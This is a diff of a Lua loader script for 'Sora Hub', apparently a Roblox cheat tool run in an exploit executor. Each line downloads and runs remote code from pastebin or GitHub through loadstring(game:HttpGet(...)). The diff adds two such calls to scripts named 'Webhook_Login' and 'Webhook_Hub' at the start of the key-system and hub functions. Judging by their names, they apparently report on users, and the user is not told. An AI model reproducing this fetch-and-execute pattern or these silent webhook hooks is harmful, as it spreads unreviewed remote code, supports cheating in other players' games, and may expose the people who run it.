@@ -1,6 +1,7 @@
 local key = loadstring(game:HttpGet("https://pastebin.com/raw/Ab3e8maX"))()
 
 function begin()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/SoraAurora/SoraHub/main/SoraHub_Webhook_Login.lua"))()
 	rconsoleclear()
 	rconsolename("Sora Hub Key System")
 	rconsoleprint("@@LIGHT_CYAN@@")
@@ -33,6 +34,7 @@ function begin()
 end
 
 function SoraHub()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/SoraAurora/SoraHub/main/SoraHub_Webhook_Hub.lua"))()
 	if game.PlaceId == 8884433153 then -- Collect all pets
 
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/SoraAurora/SoraHub/main/SoraHub_Collect_the_Pets.lua"))()
